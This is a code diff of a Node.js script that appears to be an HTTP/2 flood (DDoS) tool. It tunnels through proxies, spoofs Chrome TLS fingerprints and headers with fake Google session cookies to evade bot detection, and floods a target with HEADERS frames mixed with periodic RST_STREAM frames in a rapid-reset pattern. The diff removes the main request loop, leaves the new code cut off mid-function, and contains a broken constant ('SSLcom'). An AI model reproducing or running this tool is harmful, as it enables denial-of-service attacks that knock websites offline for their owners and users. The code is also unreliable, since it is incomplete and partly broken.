@@ -322,27 +322,22 @@ function go() {
         return
     }
 
-    const ja4Ciphers = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
-    const ja4SigAlgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384';
-    const ja4Curves = 'X25519:secp256r1:secp384r1';
-
     const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
         netSocket.once('data', () => {
             tlsSocket = tls.connect({
                 socket: netSocket,
                 ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                 servername: url.host,
-                ciphers: ja4Ciphers,
-                sigalgs: ja4SigAlgs,
-                ecdhCurve: ja4Curves,
-                honorCipherOrder: true,
+                ciphers: 'GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure: true,
                 minVersion: 'TLSv1.2',
                 maxVersion: 'TLSv1.3',
-                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
-                secure: true,
                 rejectUnauthorized: false
             }, () => {
                 if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
+
                     if (forceHttp == 2) {
                         tlsSocket.end(() => tlsSocket.destroy())
                         return
@@ -359,7 +354,9 @@ function go() {
                             }
                         })
                     }
+
                     main()
+
                     tlsSocket.on('error', () => {
                         tlsSocket.end(() => tlsSocket.destroy())
                     })
@@ -378,6 +375,7 @@ function go() {
 
                 const updateWindow = Buffer.alloc(4)
                 updateWindow.writeUInt32BE(custom_update, 0)
+                 
 
                 let oke = 12012;
                 let oke1 = 12302;
@@ -385,7 +383,7 @@ function go() {
                 oke += 1;
                 oke1 += 1;
                 oke2 += 1;
-                const frames1 = [];
+                const frames1= [];
                 const frames = [
                     Buffer.from(PREFACE, 'binary'),
                     encodeFrame(0, 4, encodeSettings([
@@ -411,23 +409,37 @@ function go() {
 
                             if (frame.type == 1) {
                                 const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
-                                if (status == 403) {
+
+                                if(status == 403) {
                                     tlsSocket.write(encodeRstStream(0, 3, 0));
                                     tlsSocket.end(() => tlsSocket.destroy());
                                     netSocket.end(() => netSocket.destroy());
+                                    
                                 }
-                                if (!statuses[status]) statuses[status] = 0
+
+                                if (!statuses[status])
+                                    statuses[status] = 0
+
                                 statuses[status]++
                             }
-
+                            
                             if (frame.type == 7 || frame.type == 5) {
-                                if (frame.type == 7 && debugMode) {
-                                    if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0
-                                    statuses["GOAWAY"]++
+                                if (frame.type == 7) {
+                                    if (debugMode) {
+
+                                        
+
+                                        if (!statuses["GOAWAY"])
+                                            statuses["GOAWAY"] = 0
+
+                                        statuses["GOAWAY"]++
+                                    }
                                 }
+
                                 tlsSocket.write(encodeRstStream(0, 3, 0));
                                 tlsSocket.end(() => tlsSocket.destroy())
                             }
+
                         } else {
                             break
                         }
@@ -435,134 +447,21 @@ function go() {
                 })
 
                 tlsSocket.write(Buffer.concat(frames1))
-
                 function main() {
-                    if (tlsSocket.destroyed) return
-
+                    if (tlsSocket.destroyed) {
+                        return
+                    }
                     const requests = []
-                    const customHeadersArray = []
+                    const customHeadersArray = [];
 
-                    if (customHeaders) {
-                        const customHeadersList = customHeaders.split('#')
-                        for (const header of customHeadersList) {
-                            const [name, value] = header.split(':').map(part => part?.trim())
-                            if (name && value) {
-                                customHeadersArray.push({ [name.toLowerCase()]: value })
-                            }
-                        }
-                    }
-
-                    let currentRatelimit = randrate !== undefined ? getRandomInt(1, 64) : parseInt(ratelimit)
-
-                    for (let i = 0; i < (isFull ? currentRatelimit : 1); i++) {
-                        const chromeVersion = getRandomInt(120, 128);
-                        const platforms = ['"Windows"', '"macOS"', '"Linux"'];
-                        const selectedPlatform = platforms[Math.floor(Math.random() * platforms.length)];
-                        const languages = [
-                            'en-US,en;q=0.9',
-                            'vi-VN,vi;q=0.9,en;q=0.8',
-                            'fr-FR,fr;q=0.9,en;q=0.8',
-                            'ja-JP,ja;q=0.9,en;q=0.8',
-                            'zh-CN,zh;q=0.9,en;q=0.8'
-                        ];
-                        const selectedLang = languages[Math.floor(Math.random() * languages.length)];
-                        const acceptHeader = selectedPlatform === '"Windows"' 
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
-
-                        const fakeSession = `NID=517=${randstr(20)}_${randstr(15)}; HSID=${randstr(12)}; SSID=${randstr(12)}; APISID=${randstr(12)}; SAPISID=${randstr(12)}`;
-
-                        const headers = {
-                            ":method": reqmethod,
-                            ":authority": url.hostname,
-                            ":scheme": "https",
-                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                            "accept": acceptHeader,
-                            "accept-encoding": "gzip, deflate, br",
-                            "accept-language": selectedLang,
-                            "cache-control": "max-age=0",
-                            "sec-ch-ua": `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not?A_Brand";v="99"`,
-                            "sec-ch-ua-mobile": "?0",
-                            "sec-ch-ua-platform": selectedPlatform,
-                            "sec-fetch-dest": "document",
-                            "sec-fetch-mode": "navigate",
-                            "sec-fetch-site": "none",
-                            "sec-fetch-user": "?1",
-                            "upgrade-insecure-requests": "1",
-                            "user-agent": `Mozilla/5.0 (${selectedPlatform === '"Windows"' ? 'Windows NT 10.0; Win64; x64' : 'Macintosh; Intel Mac OS X 10_15_7'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`,
-                            "dnt": "1"
-                        };
-
-                        
-                        if (hcookie) {
-                            headers["cookie"] = `${hcookie}; ${fakeSession}`;
-                        } else {
-                            headers["cookie"] = fakeSession;
-                        }
-
-                        if (currentRefererValue) {
-                            headers["referer"] = currentRefererValue;
-                        }
-
-                        for (const custom of customHeadersArray) {
-                            for (const [k, v] of Object.entries(custom)) {
-                                headers[k] = v;
-                            }
-                        }
-
-                        const packed = Buffer.concat([
-                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                            hpack.encode(Object.entries(headers))
-                        ])
-                        const flags = 0x1 | 0x4 | 0x8 | 0x20
-                        const encodedFrame = encodeFrame(streamId, 1, packed, flags)
-                        const frame = Buffer.concat([encodedFrame])
-
-                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
-                            const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)
-                            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]))
-                            STREAMID_RESET = 0
-                        }
-
-                        requests.push(encodeFrame(streamId, 1, packed, 0x25))
-                        streamId += 2
-                    }
-
-                    tlsSocket.write(Buffer.concat(requests), (err) => {
-                        setTimeout(() => {
-                            main()
-                        }, 1000 / currentRatelimit)
-                    })
-                }
-                main()
-            }).on('error', () => {
-                tlsSocket.destroy()
-            })
-        })
-        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
-    }).once('error', () => {}).once('close', () => {
-        if (tlsSocket) {
-            tlsSocket.end(() => { tlsSocket.destroy(); go() })
-        }
-    })
-
-    netSocket.on('error', (error) => {
-        if (netSocket) netSocket.destroy()
-        if (tlsSocket) tlsSocket.end()
-    })
-
-    netSocket.on('close', () => {
-        if (netSocket) netSocket.destroy()
-        if (tlsSocket) tlsSocket.end()
-    })
-}
-    
-    function cleanup(error) {
-        if (netSocket) {
-            netSocket.destroy();
-        }
-        if (tlsSocket) {
-            tlsSocket.end();
+                      if (customHeaders) {
+    const customHeadersList = customHeaders.split('#');
+    for (const header of customHeadersList) {
+        const [name, value] = header.split(':').map(part => part?.trim());
+        if (name && value) {
+            customHeadersArray.push({ [name.toLowerCase()]: value });
+        } else {
+            console.warn(`Invalid header format for: ${header}`);
         }
     }
 }
